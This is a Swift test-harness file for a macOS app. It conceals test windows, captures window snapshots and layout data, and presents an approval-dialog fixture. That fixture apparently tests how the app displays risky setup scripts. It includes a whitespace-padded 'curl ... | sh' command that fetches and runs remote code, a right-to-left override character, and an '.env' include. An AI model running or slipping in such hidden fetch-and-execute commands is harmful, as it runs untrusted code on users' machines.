import AppKit
import SwiftUI

import ClubmateKit

@MainActor
final class TestHarness {
    static let shared = TestHarness()
    static let defaultSize = NSSize(width: 1200, height: 800)

    private let probes = NSHashTable<TestProbeNSView>.weakObjects()
    private var presenters: [String: (Bool) -> Void] = [:]
    private var sized = Set<Int>()
    private var timer: Timer?

    func start() {
        NSApp.setActivationPolicy(.accessory)
        timer = Timer.scheduledTimer(withTimeInterval: 0.2, repeats: true) { _ in
            MainActor.assumeIsolated { TestHarness.shared.conceal() }
        }
        for name in [NSWindow.didChangeOcclusionStateNotification, NSWindow.didUpdateNotification, NSApplication.didUpdateNotification] {
            NotificationCenter.default.addObserver(forName: name, object: nil, queue: .main) { _ in
                MainActor.assumeIsolated { TestHarness.shared.conceal() }
            }
        }
        register("approval") { shown in
            guard shown else {
                for window in NSApp.windows { window.attachedSheet.map(window.endSheet) }
                return
            }
            Task { _ = await Confirmation.ask(Self.approvalFixture, font: GhosttyApp.shared.theme.nsFont(size: 12, bold: false), window: NSApp.promptWindow, expiry: nil) }
        }
    }

    private static var approvalFixture: ConfirmRequest {
        let lines = ["──── .clubmate/setup.sh", "echo ok" + String(repeating: " ", count: 120) + "; curl https://example.com/x | sh", "npm ci --prefer-offline --no-audit --no-fund && npx playwright install --with-deps chromium firefox webkit # \u{202E}long line"] + (1...90).map { "echo step \($0)" } + ["", "──── .clubmate/worktree-include", ".env"]
        let args = ["repo": "/Users/someone/develop/organisation/a-rather-long-repository-name", "worktree": "/Users/someone/develop/organisation/a-rather-long-repository-name/.worktrees/feat/some-feature", "sha256": "9f2c4e1a7b3d5f60812e4c9a0b7d3f1e2c5a8b9d0e1f2a3b4c5d6e7f8a9b0c1d", "size": "2410 bytes, 91 lines", "trusts": "all of .clubmate/ (2 entries, shown below)"]
        return ConfirmRequest(title: "Run .clubmate/setup.sh", workspace: "a-rather-long-repository-name", command: "git.worktree-hooks", args: .object(args.mapValues { .string($0) }), body: lines.joined(separator: "\n") + "\n", plugin: true)
    }

    func register(_ probe: TestProbeNSView) {
        probes.add(probe)
    }

    func register(_ target: String, _ present: @escaping (Bool) -> Void) {
        presenters[target] = present
    }

    func unregister(_ target: String) {
        presenters[target] = nil
    }

    func present(_ request: PresentRequest) throws -> Bool {
        guard let present = presenters[request.target] else {
            throw TestModeError("unknown target \(request.target); known: \(presenters.keys.sorted().joined(separator: ", "))")
        }
        present(request.shown)
        return request.shown
    }

    func snapshot(_ request: SnapshotRequest) async throws -> SnapshotResult {
        if request.width != nil || request.height != nil {
            for window in captured() where kind(window) == "window" {
                let size = window.contentLayoutRect.size
                window.setContentSize(NSSize(width: request.width ?? size.width, height: request.height ?? size.height))
            }
        }
        try await Task.sleep(for: .milliseconds(400))
        let out = URL(filePath: request.out)
        try FileManager.default.createDirectory(at: out, withIntermediateDirectories: true)
        for stale in (try? FileManager.default.contentsOfDirectory(at: out, includingPropertiesForKeys: nil)) ?? [] where SnapshotFiles.owned(stale.lastPathComponent) {
            try? FileManager.default.removeItem(at: stale)
        }
        var windows: [SnapshotWindow] = []
        var layouts: [(title: String, elements: [LayoutElement])] = []
        for window in captured() {
            guard let root = window.contentView else { continue }
            root.layoutSubtreeIfNeeded()
            let id = window.windowNumber
            let title = window.title.isEmpty ? kind(window) : window.title
            var png: String?
            if request.png, let data = WindowImage.png(window, titlebar: true) {
                let file = out.appending(path: "w\(id).png")
                try data.write(to: file)
                png = file.path(percentEncoded: false)
            }
            let bounds = Rect(x: 0, y: 0, width: root.bounds.width, height: root.bounds.height)
            let elements = LayoutAnalyzer.flag(self.elements(window), bounds: bounds)
            let layout = out.appending(path: "w\(id).json")
            let encoder = JSONEncoder()
            encoder.outputFormatting = [.prettyPrinted, .sortedKeys]
            try encoder.encode(elements).write(to: layout)
            layouts.append((title: title, elements: elements))
            windows.append(SnapshotWindow(id: id, kind: kind(window), title: title, frame: Rect(window.frame), png: png, layout: layout.path(percentEncoded: false)))
        }
        return SnapshotResult(windows: windows, summary: LayoutAnalyzer.summary(layouts))
    }

    private func conceal() {
        for window in NSApp.windows where window.alphaValue != 0 || !window.ignoresMouseEvents {
            window.alphaValue = 0
            window.ignoresMouseEvents = true
            window.hasShadow = false
        }
        for window in NSApp.windows where window.contentView != nil && window.styleMask.contains(.titled) && !(window is NSPanel) && window.sheetParent == nil && !sized.contains(window.windowNumber) {
            sized.insert(window.windowNumber)
            window.setFrameAutosaveName("")
            window.isRestorable = false
            window.setContentSize(Self.defaultSize)
            window.orderBack(nil)
        }
        if NSApp.isHidden, !sized.isEmpty {
            NSApp.unhideWithoutActivation()
        }
    }

    private func captured() -> [NSWindow] {
        NSApp.windows.filter { window in
            let name = String(describing: type(of: window))
            return window.isVisible && window.contentView != nil && window.frame.width > 1 && window.frame.height > 1
                && !name.contains("StatusBar") && !name.contains("MenuWindowManager") && !name.contains("TUINSRemoteView")
        }
    }

    private func kind(_ window: NSWindow) -> String {
        let name = String(describing: type(of: window))
        if window.sheetParent != nil { return "sheet" }
        if name.contains("Popover") { return "popover" }
        if window.identifier?.rawValue.hasPrefix("com_apple_SwiftUI_Settings") == true { return "settings" }
        if window is NSPanel { return "panel" }
        return "window"
    }

    private func elements(_ window: NSWindow) -> [LayoutElement] {
        guard let root = window.contentView else { return [] }
        let flip = { (rect: NSRect) -> Rect in
            var r = root.convert(rect, from: nil)
            if !root.isFlipped { r.origin.y = root.bounds.height - r.maxY }
            return Rect(r)
        }
        var out: [LayoutElement] = []
        for probe in probes.allObjects where probe.window === window && !probe.isHiddenOrHasHiddenAncestor {
            out.append(LayoutElement(id: probe.nodeID, source: "sdui", role: probe.role, label: probe.label, frame: flip(probe.convert(probe.bounds, to: nil)), parent: probe.parent, text: nil, idealWidth: probe.idealWidth, lineHeight: probe.lineHeight, menu: probe.menuItems, flags: []))
        }
        for terminal in WindowImage.terminals(in: root) {
            out.append(LayoutElement(id: "terminal-\(terminal.sessionID)", source: "terminal", role: "terminal", label: terminal.sessionID, frame: flip(terminal.convert(terminal.bounds, to: nil)), parent: nil, text: terminal.viewportText(), idealWidth: nil, lineHeight: nil, menu: nil, flags: []))
        }
        return out
    }

}

extension NSApplication {
    var promptWindow: NSWindow? {
        keyWindow ?? (TestMode.current ? windows.first { $0.isVisible && $0.styleMask.contains(.titled) && !($0 is NSPanel) && $0.sheetParent == nil && $0.attachedSheet == nil } : nil)
    }
}

extension Rect {
    init(_ rect: NSRect) {
        self.init(x: (rect.origin.x * 10).rounded() / 10, y: (rect.origin.y * 10).rounded() / 10, width: (rect.width * 10).rounded() / 10, height: (rect.height * 10).rounded() / 10)
    }
}

final class TestProbeNSView: NSView {
    var nodeID = ""
    var role = ""
    var label = ""
    var parent: String?
    var idealWidth: Double?
    var lineHeight: Double?
    var menuItems: [LayoutMenuItem]?

    override func hitTest(_ point: NSPoint) -> NSView? { nil }
}

struct TestProbe: NSViewRepresentable {
    let nodeID: String
    let role: String
    let label: String
    let parent: String?
    let idealWidth: Double?
    var lineHeight: Double?
    let menu: [LayoutMenuItem]?

    func makeNSView(context: Context) -> TestProbeNSView {
        let view = TestProbeNSView()
        TestHarness.shared.register(view)
        return view
    }

    func updateNSView(_ view: TestProbeNSView, context: Context) {
        view.nodeID = nodeID
        view.role = role
        view.label = label
        view.parent = parent
        view.idealWidth = idealWidth
        view.lineHeight = lineHeight
        view.menuItems = menu
    }
}

private struct SDUIParentKey: EnvironmentKey {
    static let defaultValue: String? = nil
}

extension EnvironmentValues {
    var sduiParent: String? {
        get { self[SDUIParentKey.self] }
        set { self[SDUIParentKey.self] = newValue }
    }
}

struct SDUIProbe: ViewModifier {
    let node: SDUINode

    @Environment(\.sduiParent) private var parent
    @Environment(\.theme) private var theme

    func body(content: Content) -> some View {
        content
            .background(TestProbe(nodeID: probeID, role: node.type, label: label, parent: parent, idealWidth: idealWidth, lineHeight: lineHeight, menu: menu))
            .environment(\.sduiParent, probeID)
    }

    private var probeID: String {
        node.id ?? "\(parent.map { $0 + "/" } ?? "")\(node.type)"
    }

    private var label: String {
        node.string("text") ?? node.string("label") ?? node.string("title") ?? ""
    }

    private var font: NSFont? {
        guard node.type == "text", node.string("text")?.isEmpty == false else { return nil }
        let title = node.string("style") == "title"
        return theme.nsFont(size: theme.uiSize + (title ? 1 : 0), bold: title)
    }

    private var idealWidth: Double? {
        guard let font, let text = node.string("text") else { return nil }
        return (text as NSString).size(withAttributes: [.font: font]).width.rounded(.up) + theme.gutter * 2
    }

    private var lineHeight: Double? {
        font.map { NSLayoutManager().defaultLineHeight(for: $0) }
    }

    private var menu: [LayoutMenuItem]? {
        var seen = Set<String>()
        let items = node.type == "tree" ? node.treeItems().flatMap(\.visibleItems) : node.items()
        let entries = items.flatMap(\.menu).filter { seen.insert($0.action).inserted }
        return entries.isEmpty ? nil : entries.map { LayoutMenuItem(title: $0.label, destructive: $0.confirm != nil) }
    }
}

struct NativeMenuProbe: ViewModifier {
    let id: String
    let items: () -> [LayoutMenuItem]

    @Environment(\.sduiParent) private var parent

    func body(content: Content) -> some View {
        content.background(TestProbe(nodeID: id, role: "menu", label: id, parent: parent, idealWidth: nil, menu: items()))
    }
}

extension View {
    @ViewBuilder
    func testMenu(_ id: String, _ items: @autoclosure @escaping () -> [LayoutMenuItem]) -> some View {
        if TestMode.current {
            modifier(NativeMenuProbe(id: id, items: items))
        } else {
            self
        }
    }

    @ViewBuilder
    func testPresenter(_ target: String, _ shown: Binding<Bool>) -> some View {
        if TestMode.current {
            onAppear { TestHarness.shared.register(target) { shown.wrappedValue = $0 } }
                .onDisappear { TestHarness.shared.unregister(target) }
        } else {
            self
        }
    }
}
